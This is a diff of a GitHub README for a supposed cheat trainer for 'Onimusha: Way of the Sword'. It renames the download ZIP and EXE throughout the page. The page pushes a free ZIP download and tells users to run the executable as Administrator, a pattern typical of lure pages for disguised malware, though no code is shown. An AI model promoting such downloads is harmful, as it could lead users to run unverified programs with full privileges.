@@ -16,19 +16,19 @@
 
 <br/><br/>
 
-[![Version](https://img.shields.io/badge/v1.0.0-latest-CC2200?style=flat-square&logo=github)](../../releases/download/main/Onimusha-Trainer.zip)
-[![Game](https://img.shields.io/badge/Onimusha%3A_Way_of_the_Sword-2026-8B0000?style=flat-square)](../../releases/download/main/Onimusha-Trainer.zip)
-[![OS](https://img.shields.io/badge/Windows-10_%7C_11-0078D4?style=flat-square&logo=windows)](../../releases/download/main/Onimusha-Trainer.zip)
-[![Status](https://img.shields.io/badge/Status-Working-00C853?style=flat-square)](../../releases/download/main/Onimusha-Trainer.zip)
+[![Version](https://img.shields.io/badge/v1.0.0-latest-CC2200?style=flat-square&logo=github)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
+[![Game](https://img.shields.io/badge/Onimusha%3A_Way_of_the_Sword-2026-8B0000?style=flat-square)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
+[![OS](https://img.shields.io/badge/Windows-10_%7C_11-0078D4?style=flat-square&logo=windows)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
+[![Status](https://img.shields.io/badge/Status-Working-00C853?style=flat-square)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
 [![License](https://img.shields.io/badge/License-MIT-blueviolet?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/RestraintRatTurbine/onimusha-trainer?style=flat-square&color=FFD700)](../../stargazers)
-[![Downloads](https://img.shields.io/github/downloads/RestraintRatTurbine/onimusha-trainer/total?style=flat-square&color=CC2200)](../../releases)
+[![Stars](https://img.shields.io/github/stars/RestraintRatTurbine/onimusha-way-of-the-sword-trainer?style=flat-square&color=FFD700)](../../stargazers)
+[![Downloads](https://img.shields.io/github/downloads/RestraintRatTurbine/onimusha-way-of-the-sword-trainer/total?style=flat-square&color=CC2200)](../../releases)
 
 <br/>
 
 ### ⬇️ Direct Download — 100% Free, No Key, No Survey
 
-<a href="../../releases/download/main/Onimusha-Trainer.zip">
+<a href="../../releases/download/main/onimusha-way-of-the-sword-trainer.zip">
   <img src="https://img.shields.io/badge/%E2%9A%94%EF%B8%8F%20Onimusha--Trainer.zip%20%E2%80%94%20FREE%20DOWNLOAD-CC2200?style=for-the-badge&logo=github&logoColor=white" height="48"/>
 </a>
 
@@ -61,8 +61,8 @@
 ## 📦 What's Inside the ZIP
 
 ```
-Onimusha-Trainer.zip
-├── Onimusha-Trainer.exe    ← Main trainer executable
+onimusha-way-of-the-sword-trainer.zip
+├── onimusha-way-of-the-sword-trainer.exe    ← Main trainer executable
 ├── config.ini              ← Hotkey configuration
 ├── README.txt              ← Quick start
 └── LICENSE.txt
@@ -100,17 +100,17 @@ Onimusha-Trainer.zip
 ```
   ┌───────────────────────────────────────────────────────────────┐
   │                                                               │
-  │   1  →  Download Onimusha-Trainer.zip (link above)          │
+  │   1  →  Download onimusha-way-of-the-sword-trainer.zip (link above)          │
   │   2  →  Extract to any folder on your PC                   │
   │   3  →  Launch Onimusha: Way of the Sword                  │
-  │   4  →  Right-click Onimusha-Trainer.exe → Run as Admin    │
+  │   4  →  Right-click onimusha-way-of-the-sword-trainer.exe → Run as Admin    │
   │   5  →  Press F1–F9 to toggle cheats in-game              │
   │   6  →  Press END to safely unload when done ✔            │
   │                                                               │
   └───────────────────────────────────────────────────────────────┘
 ```
 
-<a href="../../releases/download/main/Onimusha-Trainer.zip">
+<a href="../../releases/download/main/onimusha-way-of-the-sword-trainer.zip">
   <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20FREE%20Download%20%E2%80%94%20Onimusha--Trainer.zip-CC2200?style=for-the-badge&logo=github&logoColor=white" height="44"/>
 </a>
 
@@ -178,7 +178,7 @@ Updated offsets are pushed within **48 hours** of any game patch. Re-download fr
 <br/>
 
 1. Launch the game **first**, then run the trainer
-2. Run `Onimusha-Trainer.exe` as **Administrator**
+2. Run `onimusha-way-of-the-sword-trainer.exe` as **Administrator**
 3. Wait for "Process Found: Onimusha.exe ✔" status at the bottom
 
 </details>
@@ -212,7 +212,7 @@ The authors take no responsibility for any use of this software.
 <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,2,24&height=130&section=footer&animation=fadeIn"/>
 
 <sub>
-  <a href="../../releases/download/main/Onimusha-Trainer.zip">⬇️ Direct Download</a>
+  <a href="../../releases/download/main/onimusha-way-of-the-sword-trainer.zip">⬇️ Direct Download</a>
   &nbsp;·&nbsp;
   <a href="../../issues">🐛 Report a Bug</a>
   &nbsp;·&nbsp;
@@ -226,4 +226,5 @@ The authors take no responsibility for any use of this software.
 ![Views](https://komarev.com/ghpvc/?RestraintRatTurbine=RestraintRatTurbine&label=Repo+Views&color=CC2200&style=flat-square)
 
 </div>
+
 
